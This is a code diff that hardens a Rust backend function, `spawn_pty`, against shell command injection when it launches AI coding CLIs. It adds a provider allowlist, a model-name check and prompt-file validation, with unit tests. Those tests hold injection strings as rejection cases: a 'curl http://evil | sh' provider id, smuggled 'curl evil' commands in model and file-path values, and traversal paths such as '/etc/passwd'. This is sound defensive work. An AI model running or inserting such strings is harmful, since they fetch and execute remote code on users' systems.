@@ -254,6 +254,55 @@ fn provider_accepts_prompt_pipe(provider: &str) -> bool {
     !matches!(provider, "cursor" | "copilot")
 }
 
+// `spawn_pty`'s provider/model/prompt-file inputs cross the renderer→Rust trust boundary and are
+// interpolated into a `powershell -Command` / `bash -lc` string, so everything that reaches that
+// string must pass through the validators below. (`custom_command` is exempt by design: like the
+// review verification command, it is operator-typed and shown verbatim in the UI before launch.)
+
+/// Allowlist of launchable provider CLIs. Returns the executable invocation for a known
+/// provider id, `None` otherwise — an unknown provider must never run verbatim as a command.
+fn provider_command(provider: &str) -> Option<&'static str> {
+    match provider {
+        "codex" => Some("codex"),
+        "claude" => Some("claude"),
+        "gemini" => Some("gemini"),
+        "openrouter" => Some("openrouter"),
+        "opencode" => Some("opencode"),
+        "cursor" => Some("cursor-agent"),
+        "droid" => Some("droid"),
+        "copilot" => Some("gh copilot"),
+        "pi" => Some("pi"),
+        _ => None,
+    }
+}
+
+/// Model names are interpolated inside a double-quoted shell string; restrict them to
+/// characters that are inert there (no `"`, backtick, `$`, backslash, whitespace, ...).
+fn is_safe_model(model: &str) -> bool {
+    !model.is_empty()
+        && model
+            .chars()
+            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.' | ':' | '/' | '@'))
+}
+
+/// A prompt file is interpolated into the shell command line as a redirect source. Require it
+/// to be free of shell metacharacters, project-contained (relative, no `..` — enforced by
+/// `get_project_file_path`), and already existing.
+fn validate_prompt_file(cwd: &str, prompt_file: &str) -> Result<(), String> {
+    const FORBIDDEN: &[char] = &['"', '\'', '`', '$', '<', '>', '|', ';', '&', '\n', '\r'];
+    if prompt_file.contains(FORBIDDEN) {
+        return Err("Prompt file path contains forbidden characters".to_string());
+    }
+    if cwd.is_empty() {
+        return Err("Prompt file requires a project working directory".to_string());
+    }
+    let resolved = crate::project::get_project_file_path(cwd, prompt_file)?;
+    if !resolved.is_file() {
+        return Err(format!("Prompt file not found in project: {}", prompt_file));
+    }
+    Ok(())
+}
+
 #[tauri::command]
 pub async fn spawn_pty(
     id: String,
@@ -310,25 +359,21 @@ pub async fn spawn_pty(
 
     if let Some(provider) = ai_provider.as_deref() {
         if provider != "custom" {
-            let provider_cleaned = match provider {
-                "codex" => "codex",
-                "claude" => "claude",
-                "gemini" => "gemini",
-                "openrouter" => "openrouter",
-                "opencode" => "opencode",
-                "cursor" => "cursor-agent",
-                "droid" => "droid",
-                "copilot" => "gh copilot",
-                "pi" => "pi",
-                _ => provider,
-            };
+            let provider_cleaned = provider_command(provider)
+                .ok_or_else(|| format!("Unknown AI provider: {}", provider))?;
 
             let model_str = model.as_deref().unwrap_or("default");
             let use_model_flag = model_str != "default" && !model_str.is_empty();
+            if use_model_flag && !is_safe_model(model_str) {
+                return Err(format!("Invalid model name: {}", model_str));
+            }
             // Only redirect the prompt file into providers that accept a piped prompt.
             let pipe_file = prompt_file
                 .as_ref()
                 .filter(|_| provider_accepts_prompt_pipe(provider));
+            if let Some(p_file) = pipe_file {
+                validate_prompt_file(&cwd, p_file)?;
+            }
 
             let run_cmd = if use_model_flag {
                 if let Some(p_file) = pipe_file {
@@ -710,4 +755,72 @@ pub fn kill_pty(
     });
 
     Ok(())
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    use std::fs;
+    use std::path::PathBuf;
+
+    #[test]
+    fn provider_allowlist_rejects_unknown_commands() {
+        assert_eq!(provider_command("codex"), Some("codex"));
+        assert_eq!(provider_command("cursor"), Some("cursor-agent"));
+        assert_eq!(provider_command("curl http://evil | sh"), None);
+        assert_eq!(provider_command("custom"), None);
+        assert_eq!(provider_command(""), None);
+    }
+
+    #[test]
+    fn safe_model_accepts_real_model_ids() {
+        for m in ["gpt-5.2", "claude-sonnet-5", "openrouter/auto", "o4:mini", "org@rev_1"] {
+            assert!(is_safe_model(m), "{m} should be accepted");
+        }
+    }
+
+    #[test]
+    fn safe_model_rejects_shell_metacharacters() {
+        for m in [
+            "x\"; curl evil/$(id); echo \"",
+            "a b",
+            "a`b",
+            "a$b",
+            "a\\b",
+            "",
+        ] {
+            assert!(!is_safe_model(m), "{m:?} should be rejected");
+        }
+    }
+
+    fn temp_project() -> PathBuf {
+        let dir = std::env::temp_dir().join(format!(
+            "saple-pty-test-{}-{}",
+            std::process::id(),
+            uuid::Uuid::new_v4()
+        ));
+        fs::create_dir_all(dir.join(".saple/agents/prompts")).unwrap();
+        fs::write(dir.join(".saple/agents/prompts/p.md"), "prompt").unwrap();
+        dir.canonicalize().unwrap()
+    }
+
+    #[test]
+    fn prompt_file_accepts_contained_relative_path() {
+        let dir = temp_project();
+        assert!(validate_prompt_file(dir.to_str().unwrap(), ".saple/agents/prompts/p.md").is_ok());
+        fs::remove_dir_all(dir).ok();
+    }
+
+    #[test]
+    fn prompt_file_rejects_traversal_absolute_and_metachars() {
+        let dir = temp_project();
+        let cwd = dir.to_str().unwrap();
+        assert!(validate_prompt_file(cwd, "../outside.md").is_err());
+        assert!(validate_prompt_file(cwd, "/etc/passwd").is_err());
+        assert!(validate_prompt_file(cwd, "C:\\Windows\\system.ini").is_err());
+        assert!(validate_prompt_file(cwd, ".saple/a\" | curl evil; \".md").is_err());
+        assert!(validate_prompt_file(cwd, ".saple/missing.md").is_err());
+        assert!(validate_prompt_file("", ".saple/agents/prompts/p.md").is_err());
+        fs::remove_dir_all(dir).ok();
+    }
 }
